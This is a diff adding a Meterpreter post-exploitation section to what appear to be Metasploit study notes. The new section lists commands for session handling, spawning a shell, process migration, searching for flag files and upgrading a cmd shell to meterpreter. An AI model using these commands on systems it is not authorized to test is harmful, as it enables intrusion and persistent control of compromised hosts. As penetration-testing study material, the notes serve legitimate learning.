@@ -18,9 +18,10 @@ Metasploit Framework
 		4. [SSH](#SSH)
 		5. [SMTP](#SMTP)
 	4. [Vulnerability Scanning](#Vulnerability_Scanning)
-	5. [msfvenom](#msfvenom)
-	6. Automation
-	7. Show information gathered
+	5. [Meterpreter](#Meterpreter)
+	6. [msfvenom](#msfvenom)
+	7. Automation
+	8. Show information gathered
 
 
 ---
@@ -223,6 +224,32 @@ Finding vulnerabilities that can be exploited
 5. `wmap_run -h` : view options
 6. `wmap_run -t` : show modules that will run
 7. `wmap_run -e` : start testing
+
+---
+
+## Meterpreter
+### Post exploitation
+In a meterpreter session
+- `sysinfo` : system info
+- `getuid` : get user info
+- `help` : display commands
+- `ctrl-z` : background : send to bg
+- sessions -h : session help menu
+- `sessions -C sysinfo -i 1` : run command on session 1
+- `sessions -n test -i 1` :name the session
+- `search -d /usr/bin -f "flag*"` :  search in directory for filename
+- `shell` : spawn native shell on OS
+	- `ctrl-c` : terminate "channel" drop shell and go back to meterpreter
+- `ps` : show processes running
+- `migrate 580` : try to migrate to the process "PID" at 580, based on privileges
+- `execute -f ifconfig` : execute a command
+
+### Upgrade shell to meterpreter
+1. `sessions -u 1` : Auto upgrade cmd shell at session 1 to meterpreter
+2. `search shell_to_meterpreter` : manually control it
+	1. `set SESSION 1` : set target session
+	2. `set LHOST eth1` : set local host
+	4. `run`
 
 ---
 
